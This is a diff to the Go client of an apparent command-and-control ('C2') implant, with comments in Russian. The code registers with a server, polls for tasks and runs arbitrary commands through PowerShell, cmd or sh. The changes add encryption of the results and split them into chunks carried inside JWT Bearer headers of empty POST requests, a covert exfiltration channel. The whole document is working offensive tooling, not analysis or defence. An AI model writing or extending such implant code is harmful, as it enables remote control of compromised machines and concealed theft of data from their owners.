@@ -6,7 +6,9 @@ package main
 
 import (
 	"bytes"
+	"c2-project/internal/chunk"
 	"c2-project/internal/crypto"
+	"c2-project/internal/jwt"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"encoding/json"
@@ -15,6 +17,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -30,8 +33,31 @@ type ClientConfig struct {
 // config - глобальная переменная с настройками клиента.
 var config ClientConfig
 
+// configFile - путь к файлу конфигурации.
+var configFile = "configs/client.json"
+
+// loadConfig - загружает конфигурацию из JSON-файла.
+func loadConfig() error {
+	file, err := os.Open(configFile)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	decoder := json.NewDecoder(file)
+	return decoder.Decode(&config)
+}
+
 // main - точка входа клиента.
 func main() {
+	// Проверяем аргумент -local для локального запуска
+	for i := 1; i < len(os.Args); i++ {
+		if os.Args[i] == "-local" {
+			configFile = "configs/client.local.json"
+			break
+		}
+	}
+
 	// Загружаем конфигурацию из файла.
 	if err := loadConfig(); err != nil {
 		log.Fatalf("Failed to load config: %v", err)
@@ -89,18 +115,6 @@ func main() {
 		sendResult(task.ID, output, status)
 		time.Sleep(1 * time.Second)
 	}
-}
-
-// loadConfig - загружает конфигурацию из JSON-файла configs/client.json.
-func loadConfig() error {
-	file, err := os.Open("configs/client.json")
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	decoder := json.NewDecoder(file)
-	return decoder.Decode(&config)
 }
 
 // registerClient - регистрирует клиента на C2-сервере.
@@ -206,35 +220,38 @@ func pollTasks() (models.Task, error) {
 }
 
 // executeCommand - выполняет команду в оболочке.
-// Сначала пытается выполнить через WSL (для Linux-команд),
-// при ошибке - выполняет как Windows-команду через CMD.
-// Если результат длиннее 5000 байт - сжимает его.
+// Поддерживает пайпы, логические операторы и сложные конструкции.
+// В Linux/Docker используется sh -c, в Windows - cmd /c с конвертацией.
 func executeCommand(cmd string) (string, error) {
-	// Разбиваем команду на аргументы для проверки.
-	parts := strings.Fields(cmd)
-	if len(parts) == 0 {
+	if len(strings.TrimSpace(cmd)) == 0 {
 		return "", fmt.Errorf("empty command")
 	}
 
-	// Пытаемся выполнить через WSL (поддержка Linux-команд).
-	wslCmd := exec.Command("wsl", "bash", "-c", cmd)
-	output, err := wslCmd.CombinedOutput()
+	var output []byte
+	var err error
 
-	// Если WSL недоступен - выполняем как Windows-команду.
-	if err != nil {
-		var execCmd *exec.Cmd
-		if len(parts) == 1 {
-			execCmd = exec.Command(parts[0])
-		} else {
-			execCmd = exec.Command(parts[0], parts[1:]...)
+	if runtime.GOOS == "windows" {
+		// Windows: используем PowerShell (лучше работает с пайпами)
+		psCmd := exec.Command("powershell", "-Command", cmd)
+		output, err = psCmd.CombinedOutput()
+		if err != nil && len(output) == 0 {
+			// Fallback на cmd /c
+			cmdCmd := exec.Command("cmd", "/c", cmd)
+			output, err = cmdCmd.CombinedOutput()
+			if err != nil && len(output) == 0 {
+				return string(output), err
+			}
 		}
-		output, err = execCmd.CombinedOutput()
-		if err != nil {
+	} else {
+		// Linux/Docker: используем sh -c
+		shCmd := exec.Command("sh", "-c", cmd)
+		output, err = shCmd.CombinedOutput()
+		if err != nil && len(output) == 0 {
 			return string(output), err
 		}
 	}
 
-	// Сжимаем результат только если он длинный (> 5000 байт).
+	// Сжимаем результат только если он длинный (> 5000 байт)
 	if len(output) > 5000 {
 		compressed, err := crypto.Compress(output)
 		if err == nil {
@@ -245,45 +262,96 @@ func executeCommand(cmd string) (string, error) {
 }
 
 // sendResult - отправляет результат выполнения на сервер.
-// Шифрует результат и передаёт в заголовке Authorization: Bearer <token>.
+// Если результат большой, он разбивается на чанки и отправляется последовательно.
 func sendResult(taskID, output, status string) {
 	log.Printf("[ENCRYPT] Encrypting result for task %s", taskID)
 
-	// Формируем результат.
 	result := map[string]interface{}{
 		"task_id": taskID,
 		"output":  output,
 		"status":  status,
 	}
 
-	// Шифруем результат.
-	token, err := protocol.EncodeRequest(result)
+	// Сериализуем в JSON
+	jsonData, err := json.Marshal(result)
 	if err != nil {
-		log.Printf("[ERROR] Failed to encode result: %v", err)
+		log.Printf("[ERROR] Failed to marshal result: %v", err)
 		return
 	}
 
-	// Создаём HTTP-запрос с пустым телом.
+	// Шифруем данные
+	encrypted, err := crypto.Encrypt(jsonData)
+	if err != nil {
+		log.Printf("[ERROR] Failed to encrypt result: %v", err)
+		return
+	}
+
+	// Если данные небольшие — отправляем как есть
+	if len(encrypted) <= 1024 {
+		token, err := jwt.Encode(encrypted)
+		if err != nil {
+			log.Printf("[ERROR] Failed to encode JWT: %v", err)
+			return
+		}
+		sendChunk("Bearer "+token, taskID, 1, 1)
+		return
+	}
+
+	// Разбиваем на чанки
+	chunks, sessionID := chunk.Split(encrypted, 1024)
+	if len(chunks) == 0 {
+		log.Printf("[ERROR] Failed to split data into chunks")
+		return
+	}
+
+	log.Printf("[CHUNK] Sending %d chunks for session %s", len(chunks), sessionID)
+
+	// Отправляем каждый чанк
+	for i, c := range chunks {
+		chunkData, err := json.Marshal(c)
+		if err != nil {
+			log.Printf("[ERROR] Failed to marshal chunk %d: %v", i, err)
+			continue
+		}
+
+		chunkEncrypted, err := crypto.Encrypt(chunkData)
+		if err != nil {
+			log.Printf("[ERROR] Failed to encrypt chunk %d: %v", i, err)
+			continue
+		}
+
+		token, err := jwt.Encode(chunkEncrypted)
+		if err != nil {
+			log.Printf("[ERROR] Failed to encode JWT for chunk %d: %v", i, err)
+			continue
+		}
+
+		sendChunk("Bearer "+token, taskID, i+1, len(chunks))
+		time.Sleep(100 * time.Millisecond)
+	}
+}
+
+// sendChunk - отправляет один чанк на сервер
+func sendChunk(token string, taskID string, seq int, total int) {
 	jsonData, _ := json.Marshal(map[string]interface{}{})
 
 	client := &http.Client{}
 	reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/results", bytes.NewReader(jsonData))
 	if err != nil {
-		log.Printf("[ERROR] Failed to send result: %v", err)
+		log.Printf("[ERROR] Failed to send chunk %d/%d: %v", seq, total, err)
 		return
 	}
-	// Передаём зашифрованный результат в заголовке Authorization.
-	reqHTTP.Header.Set("Authorization", "Bearer "+token)
+	reqHTTP.Header.Set("Authorization", token)
 	reqHTTP.Header.Set("Content-Type", "application/json")
 
 	resp, err := client.Do(reqHTTP)
 	if err != nil {
-		log.Printf("[ERROR] Failed to send result: %v", err)
+		log.Printf("[ERROR] Failed to send chunk %d/%d: %v", seq, total, err)
 		return
 	}
 	defer resp.Body.Close()
 
-	log.Printf("[SEND] Encrypted result sent to server")
+	log.Printf("[CHUNK] Sent chunk %d/%d, status: %s", seq, total, resp.Status)
 }
 
 // getTokenFromBearer - извлекает токен из заголовка Authorization.
